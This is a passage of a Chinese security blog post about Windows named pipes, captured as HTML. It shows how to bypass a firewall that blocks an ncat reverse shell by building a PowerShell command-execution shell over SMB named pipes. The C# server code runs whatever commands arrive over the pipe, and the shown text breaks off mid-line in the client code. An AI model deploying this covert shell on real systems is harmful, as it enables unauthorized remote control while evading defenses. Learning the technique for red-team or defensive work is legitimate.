@@ -1,0 +1,1292 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|sans-serif:300,300italic,400,400italic,700,700italic|Lato:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="知识回顾,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="RcoIl的窝" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="本文是根据之前文章中涉及到的【知识回顾】命名管道的一个理解和延伸进行编写的。 PS：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议阅读，文章连接：Windows 命名管道研究初探。">
+<meta name="keywords" content="知识回顾">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【知识回顾】命名管道">
+<meta property="og:url" content="https://rcoil.me/2019/11/【知识回顾】命名管道/index.html">
+<meta property="og:site_name" content="RcoIl的窝">
+<meta property="og:description" content="本文是根据之前文章中涉及到的【知识回顾】命名管道的一个理解和延伸进行编写的。 PS：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议阅读，文章连接：Windows 命名管道研究初探。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-27_12-12-03.png">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-26_21-29-45.png">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-26_21-41-09.png">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-27_11-47-54.png">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-27_12-36-47.png">
+<meta property="og:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-27_12-37-26.png">
+<meta property="og:updated_time" content="2019-11-04T07:08:53.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【知识回顾】命名管道">
+<meta name="twitter:description" content="本文是根据之前文章中涉及到的【知识回顾】命名管道的一个理解和延伸进行编写的。 PS：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议阅读，文章连接：Windows 命名管道研究初探。">
+<meta name="twitter:image" content="https://rcoil.me/image/【知识回顾】命名管道/blog_2019-10-27_12-12-03.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '6230266985318450000',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://rcoil.me/2019/11/【知识回顾】命名管道/">
+
+
+
+
+
+  <title> 【知识回顾】命名管道 | RcoIl的窝 </title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ce3d1967864bac5f69f1c1a6042e5577";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">RcoIl的窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-count">
+          <a href="/count" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-free-code-camp"></i> <br>
+            
+            阅读榜
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://rcoil.me/2019/11/【知识回顾】命名管道/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="RcoIl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RcoIl的窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                【知识回顾】命名管道
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T19:52:59+08:00">
+                2019-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/11/【知识回顾】命名管道/" class="leancloud_visitors" data-flag-title="【知识回顾】命名管道">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                <!--
+				<i class="fa fa-eye"></i>
+				-->
+				<i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文是根据之前文章中涉及到的【知识回顾】命名管道的一个理解和延伸进行编写的。</p>
+<p><strong><em>PS</em></strong>：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议阅读，文章连接：<a href="https://www.anquanke.com/post/id/190207#h2-0" target="_blank" rel="noopener">Windows 命名管道研究初探</a>。</p>
+<a id="more"></a>
+<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>之前在写 <a href="https://rcoil.me/2019/08/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/">深入了解 PsExec [知识回顾]</a>和了解 <code>SMB Beacon</code> 的时候，知道了它们都是通过【知识回顾】命名管道进行通信，所以本文通过一个常见的场景进行编写并绕过说明。</p>
+<p><strong>场景建立</strong>：在 Windows 环境中，无管理员权限的情况下，对已获取权限的机器上使用 <code>ncat</code> 反弹一个 <code>shell</code>，但是遭到防火墙或反病毒程序的阻拦 。</p>
+<h2 id="0x01-Windows-防火墙行为分析"><a href="#0x01-Windows-防火墙行为分析" class="headerlink" title="0x01 Windows 防火墙行为分析"></a>0x01 Windows 防火墙行为分析</h2><p>在 Windows 中，当尝试使用 <code>Bind()</code> 绑定一个 <code>TCP Socket</code> 时，<strong>Defender</strong> 会弹窗提示是否允许此程序进行网络连接，只有用户点击允许访问才可放行。当然，如果我们拥有管理员权限，可以将此程序添加到白名单中，允许连接。但我们这里使用的普通用户权限，是无法添加修改防火墙规则的。所以当无权限进行修改时，注定会弹窗提示，也意味着我们的此攻击操作注定失败。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加的防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"ncat.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"E:\Code\Ncat\ncat.exe"</span> action=allow</span><br></pre></td></tr></table></figure>
+<p>如果不添加防火墙规则，则会出现下图情况。</p>
+<p><img src="\image\【知识回顾】命名管道\blog_2019-10-27_12-12-03.png" alt=""></p>
+<p>这种情下，<code>Reverse shell</code> 也是会失败的，那么我们该如何绕过这种限制呢？</p>
+<p><strong>其实，这个很简单：</strong> <em>我们就直接利用防火墙默认允许的规则就行。</em></p>
+<p>在 Windows 中，通常默认允许 <strong>SMB 协议</strong> 出入站，因此，如果有什么功能或机制可以用于与外部机器进行通信的，<strong>SMB 协议</strong> 无疑是一种很好的选择。而 <strong>【知识回顾】命名管道</strong> 就是基于 <em>SMB 协议</em> 进行通信的，所以我们可以基于【知识回顾】命名管道与外部机器进行通信，从而建立控制通道。</p>
+<h2 id="0x02-【知识回顾】命名管道"><a href="#0x02-【知识回顾】命名管道" class="headerlink" title="0x02 【知识回顾】命名管道"></a>0x02 【知识回顾】命名管道</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">“【知识回顾】命名管道”</a> 又名 “明明管线”，但是通常都叫【知识回顾】命名管道，是一种简单基于 <code>SMB 协议</code>的进程间通信（Internet Process Connection - <em>IPC</em>）机制。 在计算机编程里，【知识回顾】命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信传输。<strong>这完全符合我们的需求</strong>。</p>
+<p>和一般的管道不同，【知识回顾】命名管道可以被不同进程以不同的方式方法调用（可以跨语言、跨平台）。只要程序知道【知识回顾】命名管道的名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。  </p>
+<p>默认情况下，我们无法使用【知识回顾】命名管道来控制计算机通信，但是微软提供了很多种 Windows API 函数，例如 ：</p>
+<ul>
+<li>用于实例化【知识回顾】命名管道的服务器端函数是 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-createnamedpipea" target="_blank" rel="noopener"><strong>CreateNamedPipe</strong></a></li>
+<li>接受连接的服务器端功能是 <a href="https://msdn.microsoft.com/en-us/library/Aa365146(v=VS.85" target="_blank" rel="noopener"><strong>ConnectNamedPipe</strong></a>.aspx)</li>
+<li>客户端进程通过使用 <a href="https://docs.microsoft.com/windows/desktop/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noopener"><strong>CreateFile</strong></a> 或 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-callnamedpipea" target="_blank" rel="noopener"><strong>CallNamedPipe </strong></a>函数连接到命名管管道</li>
+</ul>
+<p><strong>命名规范</strong></p>
+<p>【知识回顾】命名管道的命名是采用的 <strong>UNC 格式</strong>：<code>\\Server\Pipe\[Path]Name</code> 的。 </p>
+<p>第一部分<code>\\Server</code>指定了服务器的名字，【知识回顾】命名管道服务即在此服务器创建，其字符串部分可表示为一个小数点(表示本机)、星号(当前网络字段)、域名或是一个真正的服务；第二部分 <code>\Pipe</code> 与邮槽的 <code>\Mailslot</code> 一样是一个不可变化的硬编码字串，以指出该文件是从属于 NTFS；第三部分<code>[Path]Name</code>则使应用程序可以唯一定义及标识一个【知识回顾】命名管道的名字，而且可以设置多级目录。 </p>
+<p> 在 <code>C#</code>中，若要实现【知识回顾】命名管道，如今只需要使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeserverstream" target="_blank" rel="noopener">NamedPipeServerStream</a> 和 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.pipes.namedpipeclientstream" target="_blank" rel="noopener">NamedPipeClientStream</a> 类，开盒即食。 </p>
+<h2 id="0x03-使用-C-实现"><a href="#0x03-使用-C-实现" class="headerlink" title="0x03 使用 C#实现"></a>0x03 使用 <code>C#</code>实现</h2><p>【知识回顾】命名管道既可以支持直接字节传输模式（<code>PipeTransmissionMode.Byte</code>），也可以支持消息传输模式（<code>PipeTransmissionMode.Message</code>） 。</p>
+<ul>
+<li><p>在字节模式中，信息以连续字节流的形式在客户与服务器之间流动。这也就意味着对于客户机应用和服务器应用在任何一个特定的时间段内都无法准确知道有多少字节从管道中读出或写入。在这种通信模式中，一方在向管道写入某个数量的字节后并不能保证管道的另一方能读出等量的字节。</p>
+</li>
+<li><p>对于消息模式，客户机和服务器则是通过一系列不连续的数据包进行数据的收发。从管道发出的每一条消息都必须作为一条完整的消息读入。</p>
+</li>
+</ul>
+<p>在此建议使用消息模式。 下面先看看字节模式。</p>
+<h3 id="3-1、-测试服务端代码"><a href="#3-1、-测试服务端代码" class="headerlink" title="3.1、 测试服务端代码"></a>3.1、 测试服务端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建【知识回顾】命名管道</span></span><br><span class="line">    <span class="keyword">using</span> (NamedPipeServerStream pipeServer =</span><br><span class="line">           <span class="keyword">new</span> NamedPipeServerStream(<span class="string">"testpipe"</span>, PipeDirection.InOut, <span class="number">1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            <span class="comment">// 等待连接</span></span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="comment">// 指定传输模式</span></span><br><span class="line">            pipeServer.ReadMode = PipeTransmissionMode.Byte;</span><br><span class="line">            <span class="keyword">using</span> (StreamReader sr = <span class="keyword">new</span> StreamReader(pipeServer))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> con = sr.ReadToEnd();</span><br><span class="line">                Console.WriteLine(con);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-2、测试客户端代码"><a href="#3-2、测试客户端代码" class="headerlink" title="3.2、测试客户端代码"></a>3.2、测试客户端代码</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 连接服务端【知识回顾】命名管道</span></span><br><span class="line">        <span class="keyword">using</span> (NamedPipeClientStream pipeClient =</span><br><span class="line">               <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut, PipeOptions.None, TokenImpersonationLevel.None))</span><br><span class="line">        &#123;</span><br><span class="line">            pipeClient.Connect();</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">            <span class="keyword">using</span> (StreamWriter sw = <span class="keyword">new</span> StreamWriter(pipeClient))</span><br><span class="line">            &#123;</span><br><span class="line">                sw.WriteLine(<span class="string">"xixixi"</span>);</span><br><span class="line">                sw.Flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-3、测试结果"><a href="#3-3、测试结果" class="headerlink" title="3.3、测试结果"></a>3.3、测试结果</h3><p><img src="\image\【知识回顾】命名管道\blog_2019-10-26_21-29-45.png" alt=""></p>
+<p>此项测试使用的是字节传输模式（<code>PipeTransmissionMode.Byte</code>）。但为了执行命令，我们将上面的代码改成了 <code>PipeTransmissionMode.Message</code> 模式，并且需要引入之前在翻译文章 <a href="https://www.anquanke.com/post/id/189152" target="_blank" rel="noopener">丢掉Powershell.exe来渗透测试</a> 中看到的执行命令的一个方法。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">RunScript</span>(<span class="params"><span class="keyword">string</span> script</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    Runspace MyRunspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    MyRunspace.Open();</span><br><span class="line">    Pipeline MyPipeline = MyRunspace.CreatePipeline(); </span><br><span class="line">    MyPipeline.Commands.AddScript(script);</span><br><span class="line">    MyPipeline.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">    Collection&lt;PSObject&gt; outputs = MyPipeline.Invoke();</span><br><span class="line">    MyRunspace.Close();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line">    <span class="keyword">foreach</span> (PSObject pobject <span class="keyword">in</span> outputs) </span><br><span class="line">    &#123; </span><br><span class="line">        sb.AppendLine(pobject.ToString()); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.ToString(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-shell-实现"><a href="#0x04-shell-实现" class="headerlink" title="0x04 shell 实现"></a>0x04 shell 实现</h2><p>我们完全可以按照 <code>Psexec</code> 的原理，自己构建一个命令执行的通道。</p>
+<h3 id="4-1、服务端实现"><a href="#4-1、服务端实现" class="headerlink" title="4.1、服务端实现"></a>4.1、服务端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WaitData</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个运行空间</span></span><br><span class="line">    Runspace runspace = <span class="literal">null</span>;</span><br><span class="line">    runspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">    runspace.ApartmentState = System.Threading.ApartmentState.STA; </span><br><span class="line">    runspace.Open();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (<span class="keyword">var</span> pipeServer = <span class="keyword">new</span> NamedPipeServerStream(</span><br><span class="line">            <span class="string">"testpipe"</span>,</span><br><span class="line">            PipeDirection.InOut,</span><br><span class="line">            NamedPipeServerStream.MaxAllowedServerInstances,</span><br><span class="line">            PipeTransmissionMode.Message))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Waiting for client connection..."</span>);</span><br><span class="line">            pipeServer.WaitForConnection();</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Client connected."</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> messageBytes = ReadMessage(pipeServer);</span><br><span class="line">                <span class="keyword">var</span> line = Encoding.Default.GetString(messageBytes);</span><br><span class="line">                Console.WriteLine(<span class="string">"[*] Received: &#123;0&#125;"</span>, line);</span><br><span class="line">                <span class="keyword">if</span> (line.ToLower() == <span class="string">"exit"</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 参考：https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/</span></span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Pipeline PsPipe = runspace.CreatePipeline();</span><br><span class="line">                    PsPipe.Commands.AddScript(line);</span><br><span class="line">                    PsPipe.Commands.Add(<span class="string">"Out-String"</span>);</span><br><span class="line">                    Collection&lt;PSObject&gt; results = PsPipe.Invoke();</span><br><span class="line">                    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    <span class="keyword">foreach</span> (PSObject obj <span class="keyword">in</span> results)</span><br><span class="line">                    &#123;</span><br><span class="line">                        stringBuilder.AppendLine(obj.ToString());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> response = Encoding.Default.GetBytes(stringBuilder.ToString());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        pipeServer.Write(response, <span class="number">0</span>, response.Length);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"[!] Pipe is broken!"</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-2、客户端实现"><a href="#4-2、客户端实现" class="headerlink" title="4.2、客户端实现"></a>4.2、客户端实现</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SendData</span>(<span class="params"><span class="keyword">string</span> ServerName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">"[+] Connecting to "</span> + ServerName);</span><br><span class="line">    <span class="keyword">using</span> (<span class="keyword">var</span> pipeClient = <span class="keyword">new</span> NamedPipeClientStream(ServerName, <span class="string">"testpipe"</span>, PipeDirection.InOut))</span><br><span class="line">    &#123;</span><br><span class="line">        pipeClient.Connect(<span class="number">5000</span>);</span><br><span class="line">        pipeClient.ReadMode = PipeTransmissionMode.Message;</span><br><span class="line">        Console.WriteLine(<span class="string">"[+] Connection established succesfully."</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;   </span><br><span class="line">            Console.Write(<span class="string">"csexec&gt; 